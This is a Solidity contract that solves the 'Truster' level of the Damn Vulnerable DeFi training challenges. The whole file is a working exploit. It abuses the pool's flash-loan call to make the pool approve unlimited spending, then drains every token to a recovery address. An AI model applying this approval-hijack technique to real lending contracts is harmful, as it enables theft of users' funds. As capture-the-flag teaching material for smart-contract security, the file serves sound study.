// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {DamnValuableToken} from "../DamnValuableToken.sol";
import {TrusterLenderPool} from "./TrusterLenderPool.sol";

contract TrusterReceiver {
    DamnValuableToken public immutable token;
    TrusterLenderPool public immutable pool;

    constructor(
        DamnValuableToken _token,
        TrusterLenderPool _pool,
        address _recovery
    ) {
        token = _token;
        pool = _pool;

        // Execute the attack in the constructor so it happens in a single transaction
        _attack(_recovery);
    }

    function _attack(address recovery) internal {
        // Approve the receiver to spend all tokens on behalf of the pool
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            type(uint256).max
        );

        // Execute the flash loan in order to approve the flash loan receiver to move tokens
        pool.flashLoan(0, address(this), address(token), data);

        // Transfer all tokens to the recovery address
        token.transferFrom(
            address(pool),
            recovery,
            token.balanceOf(address(pool))
        );
    }
}
